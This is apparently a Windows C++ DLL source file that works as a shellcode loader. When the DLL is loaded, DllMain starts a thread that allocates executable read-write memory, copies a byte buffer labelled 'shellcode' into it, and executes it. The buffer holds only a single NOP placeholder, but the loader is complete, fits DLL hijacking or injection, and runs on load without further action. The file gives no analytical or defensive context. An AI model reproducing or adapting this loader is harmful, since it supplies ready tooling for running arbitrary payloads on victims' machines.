#include "pch.h"
#include <windows.h>

// shellcode
unsigned char buf[] = { 0x90 };

DWORD APIENTRY PayloadThread(LPVOID) {
    LPVOID pAddr = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(pAddr, buf, sizeof(buf));
    ((void(*)())pAddr)();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    return TRUE;
}